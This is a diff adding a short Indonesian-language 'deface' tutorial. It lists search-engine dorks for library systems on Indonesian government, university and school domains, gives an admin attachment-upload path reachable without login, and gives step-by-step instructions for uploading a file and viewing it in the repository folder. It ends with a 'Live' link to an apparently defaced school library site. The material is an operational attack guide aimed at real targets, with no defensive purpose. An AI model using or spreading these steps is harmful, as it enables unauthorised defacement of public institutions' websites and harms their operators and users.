@@ -1,0 +1,40 @@
+Deface File 
+Attachment Upload Repository
+
+
+Bahan :
+Dork :
+- inurl:/admin/modules/bibliography/pop_attach.php
+- pustaka.*.go.id
+- pustaka.*.ac.id
+- pustaka.*.sch.id
+- pustaka.*.(isi dengan domain yang lu mau :v)
+
+Exploit : /admin/modules/bibliography/pop_attach.php
+Ext file to upload (txt)
+ 
+
+Langkah-langkah :
+
+Pertama, kita dorking menggunakan salah satu dork diatas.
+
+Kedua, pilih salah satu target.
+Ketiga, masukan exploit diatas dibelang site/
+
+Contoh :
+http://sitecontoh.sch.id
+Ditambah exploit menjadi :
+http://sitecontoh.sch.id/admin/modules/bibliography/pop_attach.php
+
+Keempat, kita isi namanya dan upload file.
+
+Lalu klik unggah sekarang.
+
+Kelima, kita panggil filenya, lokasi file :site/repository/yourfile.txt
+
+
+
+
+
+
+Live : http://lib-smpn2ponorogo.sch.id/
